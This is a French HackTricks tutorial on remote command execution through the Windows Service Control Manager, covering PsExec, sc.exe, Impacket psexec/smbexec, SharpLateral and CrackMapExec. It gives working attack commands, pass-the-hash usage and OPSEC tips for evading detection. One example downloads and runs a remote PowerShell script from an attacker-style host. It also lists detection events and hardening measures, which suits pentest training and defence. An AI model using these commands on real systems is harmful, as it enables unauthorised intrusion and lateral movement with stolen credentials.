# PsExec/Winexec/ScExec/SMBExec

{{#include ../../banners/hacktricks-training.md}}

## Fonctionnement

Ces techniques détournent à distance le Windows Service Control Manager (SCM) via SMB/RPC pour exécuter des commandes sur un hôte cible. Le déroulement courant est le suivant :

1. S’authentifier auprès de la cible et accéder au partage ADMIN$ via SMB (TCP/445).
2. Copier un exécutable ou spécifier une ligne de commande LOLBAS que le service exécutera.
3. Créer un service à distance via SCM (MS-SCMR sur \PIPE\svcctl) pointant vers cette commande ou ce binaire.
4. Démarrer le service pour exécuter le payload et éventuellement capturer stdin/stdout via un named pipe.
5. Arrêter le service et effectuer le nettoyage (supprimer le service et tout binaire déposé).

Conditions requises/prérequis :
- Être administrateur local sur la cible (SeCreateServicePrivilege) ou disposer explicitement des droits nécessaires à la création de services sur la cible.
- SMB (445) accessible et partage ADMIN$ disponible ; gestion des services à distance autorisée par le pare-feu de l’hôte.
- Restrictions UAC à distance : avec des comptes locaux, le filtrage des jetons peut bloquer les administrateurs sur le réseau, sauf si l’on utilise le compte Administrator intégré ou si LocalAccountTokenFilterPolicy=1.
- Kerberos vs NTLM : l’utilisation d’un nom d’hôte/FQDN permet Kerberos ; une connexion par IP bascule souvent vers NTLM (qui peut être bloqué dans les environnements renforcés).

### ScExec/WinExec manuels via sc.exe

Voici une méthode minimale de création de service. L’image du service peut être un EXE déposé ou un LOLBAS comme cmd.exe ou powershell.exe.

```cmd
:: Execute a one-liner without dropping a binary
sc.exe \\TARGET create HTSvc binPath= "cmd.exe /c whoami > C:\\Windows\\Temp\\o.txt" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc

:: Drop a payload to ADMIN$ and execute it (example path)
copy payload.exe \\TARGET\ADMIN$\Temp\payload.exe
sc.exe \\TARGET create HTSvc binPath= "C:\\Windows\\Temp\\payload.exe" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc
```

Notes :
- Attendez-vous à une erreur de délai d’attente lors du démarrage d’un EXE qui n’est pas un service ; l’exécution a tout de même lieu.
- Pour rester plus discret du point de vue de l’OPSEC, privilégiez les commandes sans fichier (cmd /c, powershell -enc) ou supprimez les artefacts déposés.

Consultez les étapes plus détaillées ici : https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/<sup>[[3]](#references)</sup>

## Outils et exemples

### Sysinternals PsExec.exe

- Outil d’administration classique qui utilise SMB pour déposer PSEXESVC.exe dans ADMIN$, installer un service temporaire (nom par défaut : PSEXESVC) et relayer les entrées/sorties via des canaux nommés.
- Exemples d’utilisation :<sup>[[1]](#references)</sup>

```cmd
:: Interactive SYSTEM shell on remote host
PsExec64.exe -accepteula \\HOST -s -i cmd.exe

:: Run a command as a specific domain user
PsExec64.exe -accepteula \\HOST -u DOMAIN\user -p 'Passw0rd!' cmd.exe /c whoami /all

:: Customize the service name for OPSEC (-r)
PsExec64.exe -accepteula \\HOST -r WinSvc$ -s cmd.exe /c ipconfig
```

- Vous pouvez lancer directement depuis Sysinternals Live via WebDAV :

```cmd
\\live.sysinternals.com\tools\PsExec64.exe -accepteula \\HOST -s cmd.exe /c whoami
```

OPSEC
- Laisse des événements d’installation/de désinstallation de service (le nom du service est souvent PSEXESVC, sauf si -r est utilisé) et crée C:\Windows\PSEXESVC.exe pendant l’exécution.

### Impacket psexec.py (PsExec-like)

- Utilise un service intégré de type RemCom. Dépose un binaire de service temporaire (au nom généralement aléatoire) via ADMIN$, crée un service (souvent RemComSvc par défaut) et relaie les entrées/sorties via un canal nommé.

```bash
# Password auth
psexec.py DOMAIN/user:Password@HOST cmd.exe

# Pass-the-Hash
psexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST cmd.exe

# Kerberos (use tickets in KRB5CCNAME)
psexec.py -k -no-pass -dc-ip 10.0.0.10 DOMAIN/user@host.domain.local cmd.exe

# Change service name and output encoding
psexec.py -service-name HTSvc -codec utf-8 DOMAIN/user:Password@HOST powershell -nop -w hidden -c "iwr http://10.10.10.1/a.ps1|iex"
```

Artefacts
- EXE temporaire dans C:\Windows\ (8 caractères aléatoires). Le nom du service est RemComSvc par défaut, sauf s’il est remplacé.

### Impacket smbexec.py (SMBExec)

- Crée un service temporaire qui lance cmd.exe et utilise un named pipe pour les E/S. Évite généralement de déposer un payload EXE complet ; l’exécution des commandes est semi-interactive.

```bash
smbexec.py DOMAIN/user:Password@HOST
smbexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST
```

### SharpLateral and SharpMove

- [SharpLateral](https://github.com/mertdas/SharpLateral) (C#) implémente plusieurs méthodes de mouvement latéral, notamment l’exec basé sur un service.

```cmd
SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName
```

- [SharpMove](https://github.com/0xthirteen/SharpMove) inclut la modification/la création de services pour exécuter une commande à distance.

```cmd
SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
```

- Vous pouvez également utiliser CrackMapExec pour exécuter des commandes via différents backends (psexec/smbexec/wmiexec) :

```bash
cme smb HOST -u USER -p PASS -x "whoami" --exec-method psexec
cme smb HOST -u USER -H NTHASH -x "ipconfig /all" --exec-method smbexec
```

## OPSEC, détection et artefacts

Artefacts typiques sur l’hôte/le réseau lors de l’utilisation de techniques de type PsExec :
- Événements Security 4624 (Logon Type 3) et 4672 (Special Privileges) sur la cible pour le compte admin utilisé.
- Événements Security 5140/5145 File Share et File Share Detailed indiquant l’accès à ADMIN$ et la création/l’écriture de binaires de service (par exemple, PSEXESVC.exe ou un fichier .exe aléatoire de 8 caractères).
- **System** 7045 du Service Control Manager pour l’installation d’un service sur la cible : noms tels que PSEXESVC, RemComSvc ou personnalisés (`-r` / `-service-name`). Cela prouve qu’un service a été installé, pas que son image s’est exécutée. Faites correspondre son horodatage et le chemin de l’image avec les événements de processus ou, si disponible, une entrée de prefetch correspondant à l’image du service.<sup>[[4]](#references)</sup>
- Sysmon 1 (Process Create) pour services.exe ou l’image du service, 3 (Network Connect), 11 (File Create) dans C:\Windows\, 17/18 (Pipe Created/Connected) pour les pipes tels que \\.\pipe\psexesvc, \\.\pipe\remcom_* ou leurs équivalents aléatoires.
- Artefact de registre pour l’EULA de Sysinternals : HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1 sur l’hôte de l’opérateur (sauf si cette étape est supprimée).

Pistes de détection
- Déclenchez une alerte lors de l’installation d’un service dont ImagePath contient cmd.exe /c, powershell.exe ou des emplacements TEMP.
- Recherchez les créations de processus dont ParentImage est C:\Windows\PSEXESVC.exe, ou les processus enfants de services.exe exécutés sous LOCAL SYSTEM qui lancent des shells.
- Signalez les pipes nommés se terminant par -stdin/-stdout/-stderr ou portant des noms de pipe connus de clones de PsExec.

## Résolution des problèmes courants
- Accès refusé (5) lors de la création de services : l’utilisateur n’est pas réellement admin local, les restrictions UAC à distance s’appliquent aux comptes locaux, ou la protection anti-altération de l’EDR bloque le chemin du binaire du service.
- Le chemin réseau est introuvable (53) ou la connexion à ADMIN$ échoue : le pare-feu bloque SMB/RPC ou les partages d’administration sont désactivés.
- Kerberos échoue, mais NTLM est bloqué : connectez-vous avec le nom d’hôte/FQDN (pas l’adresse IP), vérifiez les SPN ou fournissez `-k`/`-no-pass` avec des tickets lors de l’utilisation d’Impacket.
- Le démarrage du service expire, mais la charge utile s’est exécutée : c’est attendu si le binaire n’est pas un véritable binaire de service ; capturez la sortie dans un fichier ou utilisez smbexec pour obtenir les E/S en direct.

## Mesures de renforcement
- Windows 11 24H2 et Windows Server 2025 exigent par défaut la signature SMB pour les connexions sortantes (et entrantes sous Windows 11). Cela ne compromet pas l’utilisation légitime de PsExec avec des identifiants valides, mais empêche les abus de relais SMB sans signature et peut affecter les appareils qui ne prennent pas en charge la signature.<sup>[[2]](#references)</sup>
- Le nouveau blocage de NTLM par le client SMB (Windows 11 24H2/Server 2025) peut empêcher le recours à NTLM lors d’une connexion par adresse IP ou à des serveurs sans Kerberos. Dans les environnements renforcés, cela empêchera l’utilisation de PsExec/SMBExec basé sur NTLM ; utilisez Kerberos (nom d’hôte/FQDN) ou configurez des exceptions si nécessaire pour des raisons légitimes.<sup>[[2]](#references)</sup>
- Principe du moindre privilège : réduisez au minimum l’appartenance au groupe des administrateurs locaux, privilégiez Just-in-Time/Just-Enough Admin, appliquez LAPS et surveillez les installations de services 7045 en configurant des alertes.

## Voir aussi

- Exécution à distance basée sur WMI (souvent sans fichier) :

{{#ref}}
./wmiexec.md
{{#endref}}

- Exécution à distance basée sur WinRM :

{{#ref}}
./winrm.md
{{#endref}}

## References

- [1] [PsExec - Sysinternals | Microsoft Learn](https://learn.microsoft.com/sysinternals/downloads/psexec)
- [2] [Renforcement de la sécurité SMB dans Windows Server 2025 et Windows 11](https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591)
- [3] [Utiliser des identifiants pour prendre le contrôle de machines Windows - Partie 2 (PSExec et services)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
- [4] [Microsoft – Résoudre les redémarrages inattendus à l’aide des journaux d’événements système](https://learn.microsoft.com/en-us/troubleshoot/windows-server/performance/troubleshoot-unexpected-reboots-system-event-logs)
{{#include ../../banners/hacktricks-training.md}}
